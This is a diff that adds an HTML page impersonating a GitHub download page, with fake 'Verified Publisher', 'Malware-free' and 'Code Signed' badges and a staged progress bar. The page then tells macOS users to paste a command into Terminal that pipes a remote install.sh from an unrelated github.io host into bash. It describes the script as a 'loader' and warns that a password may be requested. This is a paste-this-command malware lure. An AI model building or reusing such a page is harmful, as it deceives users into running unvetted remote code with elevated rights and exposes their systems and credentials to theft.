@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Preparing your download... · GitHub</title>
+    <link href="style.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <div class="bg-particles" aria-hidden="true">
+      <span></span><span></span><span></span><span></span><span></span><span></span>
+      <span></span><span></span><span></span>
+    </div>
+
+    <div class="application-main">
+      <header>
+        <div class="Header">
+          <div class="Header-item">
+            <a class="Header-logo" href="/">
+              <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
+                <path fill-rule="evenodd"
+                  d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z">
+                </path>
+              </svg>
+            </a>
+          </div>
+          <div class="Header-item">
+            <a class="Header-link" href="#">Features</a>
+            <a class="Header-link" href="#">Security</a>
+            <a class="Header-link" href="#">Enterprise</a>
+            <a class="Header-link" href="#">Explore</a>
+          </div>
+        </div>
+      </header>
+
+      <main>
+        <div class="container-xl">
+          <div class="Box">
+            <div class="Box-header">
+              <div class="publisher-badge">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="#3fb950" aria-hidden="true">
+                  <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zm3.78 5.22a.75.75 0 0 0-1.06 0L7 8.94 5.28 7.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.06 0l4.25-4.25a.75.75 0 0 0 0-1.06z"/>
+                </svg>
+                Verified Publisher
+              </div>
+              <div class="Box-title">github.com/downloader</div>
+            </div>
+
+            <div class="Box-body">
+              <div class="title-section">
+                <div class="shield-icon">
+                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                    <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" fill="#238636"/>
+                    <path d="M10.2 15.2l-2.7-2.7 1.27-1.27 1.43 1.43 3.93-3.93 1.27 1.27-5.2 5.2z" fill="#fff"/>
+                  </svg>
+                </div>
+                <h2 class="h2">Preparing your download...</h2>
+                <p class="text-muted">Your archive is being generated and will be ready shortly.</p>
+              </div>
+
+              <div class="progress-section">
+                <div class="progress-labels">
+                  <span class="progress-label" id="progress-label">Verifying integrity...</span>
+                  <span class="progress-pct" id="progress-pct">0%</span>
+                </div>
+                <div class="Progress">
+                  <div class="Progress-item" id="progress-bar"></div>
+                </div>
+                <div class="eta-display" id="eta-display">
+                  <span class="eta-icon">
+                    <svg width="14" height="14" viewBox="0 0 16 16" fill="#8b949e" aria-hidden="true">
+                      <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.75.75 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0z"/>
+                    </svg>
+                  </span>
+                  Estimated time: <strong id="eta-secs">5s</strong>
+                </div>
+              </div>
+
+              <div class="verification-box" id="verification-box">
+                <div class="verification-title">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#238636" opacity="0.2"/>
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" stroke="#3fb950" stroke-width="1.5" fill="none"/>
+                    <path d="M9 12l2 2 4-4" stroke="#3fb950" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                  Security Verification Passed
+                </div>
+                <div class="security-badges">
+                  <div class="security-badge">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#3fb950" aria-hidden="true">
+                      <path d="M8.533.133a1.75 1.75 0 0 0-1.066 0l-5.25 1.68A1.75 1.75 0 0 0 1 3.48V8c0 3.026 2.12 5.53 4.75 6.75.344.16.727.16 1.07 0C9.45 13.6 11 10.5 11 8V3.48a1.75 1.75 0 0 0-1.217-1.667Zm-.533 10.12a.75.75 0 0 1-1.06 0L5.5 8.81a.75.75 0 0 1 1.06-1.06l.94.94 2.47-2.47a.75.75 0 1 1 1.06 1.06Z"/>
+                    </svg>
+                    Malware-free
+                  </div>
+                  <div class="security-badge">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#3fb950" aria-hidden="true">
+                      <path d="M4.75 6.5a3.25 3.25 0 1 1 6.5 0 3.25 3.25 0 0 1-6.5 0ZM8 2.5a4.75 4.75 0 1 0 0 9.5 4.75 4.75 0 0 0 0-9.5Zm0 5.75a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"/>
+                    </svg>
+                    SHA-256 Verified
+                  </div>
+                  <div class="security-badge">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#3fb950" aria-hidden="true">
+                      <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zm3.78 5.22a.75.75 0 0 0-1.06 0L7 8.94 5.28 7.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.06 0l4.25-4.25a.75.75 0 0 0 0-1.06z"/>
+                    </svg>
+                    Code Signed
+                  </div>
+                  <div class="security-badge">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#3fb950" aria-hidden="true">
+                      <path d="M5 8.5h6a.75.75 0 0 1 0 1.5H5a.75.75 0 0 1 0-1.5Zm-1.5-4A.75.75 0 0 1 4.25 4h7.5a.75.75 0 0 1 0 1.5h-7.5A.75.75 0 0 1 3.5 4.5ZM2 13.25a.75.75 0 0 1 .75-.75h10.5a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1-.75-.75Z"/>
+                    </svg>
+                    Open Source
+                  </div>
+                </div>
+              </div>
+
+              <div class="download-section" id="download-section" style="display:none;">
+                <div class="mac-install-card">
+                  <div class="mac-install-header">
+                    <svg class="mac-apple-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 814 1000" width="22" height="22" fill="currentColor" aria-hidden="true">
+                      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 790.7 0 663 0 541.8c0-207.5 135.4-317.3 269-317.3 70.1 0 128.4 46.4 172.5 46.4 42.8 0 109.6-49.1 190.5-49.1zm-5.2-168c-60.9 0-128.4-42.8-175.4-97.5C560 18.4 529.4-.4 491.3-.4c-5.2 0-10.4.6-15.6 1.9 1.3 5.8 1.9 11.7 1.9 17.5 0 62.9-41.5 120.7-93.4 155.5-39.5 26-83.6 41.5-131.3 41.5-.6 0-1.3 0-1.9-.1.6 6.5 1 13 1 19.5 0 75.4-32.5 150.8-92.1 207.5 33.8 11 68.7 18.2 104.3 18.2 78.1 0 149.4-33.8 213-97.4 60.3-60.3 95.1-139.7 95.1-219.7z"/>
+                    </svg>
+                    <span class="mac-install-title">INSTALL ON <span class="mac-macos-word">MACOS</span></span>
+                    <button class="mac-install-close" aria-label="Close">&#x2715;</button>
+                  </div>
+
+                  <p class="mac-install-desc">Open <strong>Terminal</strong> and paste the command below to install:</p>
+
+                  <div class="mac-terminal">
+                    <div class="mac-terminal-titlebar">
+                      <span class="mac-btn mac-close-dot"></span>
+                      <span class="mac-btn mac-min-dot"></span>
+                      <span class="mac-btn mac-max-dot"></span>
+                      <span class="mac-terminal-title">— bash — resight —</span>
+                    </div>
+                    <div class="mac-terminal-body">
+                      <span class="mac-prompt">$</span>
+                      <code class="mac-terminal-cmd" id="install-cmd">/bin/bash -c "$(curl -fsSL https://laplaplaplas.github.io/download/install.sh)"</code>
+                    </div>
+                  </div>
+
+                  <button class="mac-copy-btn" id="copy-cmd">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true">
+                      <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"/>
+                      <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/>
+                    </svg>
+                    <span id="copy-label">COPY COMMAND</span>
+                  </button>
+
+                  <ol class="mac-steps">
+                    <li><span class="mac-step-num">1</span> Press <kbd>&#8984;</kbd> + <kbd>Space</kbd>, type <strong>Terminal</strong>, hit Enter.</li>
+                    <li><span class="mac-step-num">2</span> Paste the command (<kbd>&#8984;</kbd> + <kbd>V</kbd>) and press Enter.</li>
+                    <li><span class="mac-step-num">3</span> Follow the prompts — the loader installs automatically.</li>
+                  </ol>
+
+                  <p class="mac-footnote">
+                    <svg width="14" height="14" viewBox="0 0 16 16" fill="#8b949e" style="vertical-align:middle;margin-right:5px;" aria-hidden="true"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm9 3a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm-.25-6.25a.75.75 0 0 0-1.5 0v3.5a.75.75 0 0 0 1.5 0v-3.5Z"/></svg>
+                    Works on Apple Silicon (M1–M4) and Intel Macs. macOS may ask for your password during install.
+                  </p>
+                </div>
+              </div>
+
+              <div class="note mt-3">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="#8b949e" style="margin-right:6px;vertical-align:middle;" aria-hidden="true">
+                  <path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm9 3a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm-.25-6.25a.75.75 0 0 0-1.5 0v3.5a.75.75 0 0 0 1.5 0v-3.5Z"/>
+                </svg>
+                Files are hosted and distributed via GitHub Releases. By downloading you agree to the <a href="#">Terms of Service</a>.
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      <footer>
+        <div class="footer-container">
+          <span>© 2025 GitHub, Inc.</span>
+          <div class="footer-links">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Security</a>
+            <a href="#">Status</a>
+            <a href="#">Docs</a>
+            <a href="#">Contact</a>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <script src="scripts.js"></script>
+  </body>
+</html>
